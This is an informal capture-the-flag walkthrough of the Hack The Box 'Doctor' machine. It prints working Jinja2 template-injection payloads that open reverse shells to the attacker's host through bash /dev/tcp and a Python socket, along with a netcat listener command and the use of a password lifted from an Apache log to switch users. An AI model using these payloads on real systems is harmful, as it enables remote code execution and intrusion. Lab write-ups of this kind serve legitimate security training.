
Foun 3 ports 80,22,8089

by adding the following to `10.10.10.209 doctors.htb` we were able to find a new login page on doctors.htb

Went to doctors.htb and registered with an email with .htb emailid.

logged in with that email and were able to create posts


Directory fuzzing hasnt given us anything useful yet: how ever i can see an archive directory which gives a blank response but on viewing source we see an xml file


thomas got the revershell using putting the payload at the post and going to `/archive`, this doesnot work for me. On putting the following `{{44}}[[55]]
{{7*'7'}} would result in 7777777
{{config.items()}}` from payload all the things we get a response on the same `/archive` as mentioned for `7777777`

Like an idiot used the config payload from payload all the things SSTI `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection`
`{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}` and got an http 500 error, will try the direct bash one and see if it works.

Trying the following payload to see if it , works, its mentioned specifically for reverse shell
`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`

but will need some modification after which it is
`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.138\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`

offcourse we need to start our netcat via `nc -lvp 4444` and once we inject our payload at the  title of the new message simply go to the archive url and reload the template, once we do that we get a reverse shell


PLease not that the pay load has 2 linux commands, first one is to establish the connection and the next one is for the payload that is sent back, ideally we can also use thomas command and send commands directly via popen , will investigate further on tha.

Once got the initial shell, I tried making it better by `import pty;pty.spawn("/bin/bash");` but it didnt work so I tried using find command to see archives, backups, and configs, i found this '/var/log/apache2/backup' using the find command. then i grepped the following by grepping this file, `10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"` 

So we have password for something , on our inital shells we found, `shaun and web` in the home directory, so i tried using ssh to shaun with the password `Guitar123` and it didnt work .
so i tried getting a better shell from the initial one, and as i noticed python didnt work i tried python3 via `python3 -c 'import pty;pty.spawn("/bin/bash");'`, then i did an `su shaun` with the password `Guitar123` and bam i was in.
then i did a cat /home/shaun/user.txt and got the first flag.
